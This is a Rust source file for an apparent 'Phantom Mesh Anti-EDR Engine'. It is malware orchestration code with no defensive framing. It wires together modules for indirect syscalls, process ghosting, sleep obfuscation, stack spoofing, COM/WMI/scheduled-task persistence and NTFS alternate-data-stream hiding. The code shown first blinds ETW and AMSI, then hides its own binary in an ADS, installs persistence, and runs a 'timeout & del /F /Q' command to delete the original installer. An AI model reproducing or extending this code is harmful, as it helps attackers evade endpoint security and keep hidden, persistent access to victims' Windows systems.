//! # Windows Anti-EDR Engine
//!
//! Zero Artifacts, Zero Dependencies Anti-EDR system.
//!
//! ## Modules
//! - `syscalls` - Indirect syscalls (Gate Jumping)
//! - `ghosting` - Process ghosting (execute from deleted file)
//! - `obfuscation` - Sleep obfuscation (Ekko technique)
//! - `stack_spoof` - Call stack spoofing (synthetic frames)
//! - `persistence` - COM hijacking + WMI + hidden task
//! - `ads` - NTFS Alternate Data Streams storage

pub mod ads;
pub mod persistence;
pub mod ghosting;
pub mod obfuscation;
pub mod stack_spoof;
pub mod syscalls;
pub mod blinding;

use log::{info, warn, error, debug};

/// Initialize and apply Windows stealth measures
pub fn check_and_apply_stealth() {
    info!("[AntiEDR] Phantom Mesh Anti-EDR Engine v2.0");

    // 0. BLINDING (ETW + AMSI) - Do this FIRST
    blinding::apply_all_blinding();
    
    // Check if already in ghost mode
    let is_ghost = std::env::args().any(|arg| arg == "--ghost");
    let is_from_ads = ads::is_running_from_ads();
    
    if is_ghost || is_from_ads {
        info!("[AntiEDR] GHOST MODE active");
        run_ghost_mode();
        return;
    }
    
    // First run - install stealth package
    info!("[AntiEDR] First run - installing stealth...");
    
    match install_stealth_package() {
        Ok(_) => {
            info!("[AntiEDR] Stealth installed");
            schedule_self_destruct();
        }
        Err(e) => {
            error!("[AntiEDR] Installation failed: {}", e);
        }
    }
}

/// Install the stealth package
fn install_stealth_package() -> Result<(), String> {
    // 1. Install self to ADS
    let ads_path = ads::install_self_to_ads()
        .map_err(|e| format!("ADS failed: {}", e))?;
    info!("[AntiEDR] Payload hidden: {}", ads_path);
    
    // 2. Apply persistence triad
    persistence::apply_persistence_triad(&ads_path);
    
    Ok(())
}

/// Run in ghost mode (already hidden)
fn run_ghost_mode() {
    debug!("[AntiEDR] Ghost mode initialized");
    
    // Verify syscall resolution
    if let Some(sc) = syscalls::Syscall::resolve(syscalls::HASH_NT_CLOSE) {
        debug!("[AntiEDR] Syscalls OK: NtClose SSN=0x{:04X}", sc.ssn);
    } else {
        warn!("[AntiEDR] Syscall resolution failed");
    }
}

/// Schedule deletion of original installer
fn schedule_self_destruct() {
    if let Ok(exe) = std::env::current_exe() {
        let path = exe.to_string_lossy();
        let _ = std::process::Command::new("cmd")
            .args(["/C", "timeout", "/T", "2", "/NOBREAK", ">nul", "&", "del", "/F", "/Q", &path])
            .spawn();
        debug!("[AntiEDR] Self-destruct scheduled");
    }
}
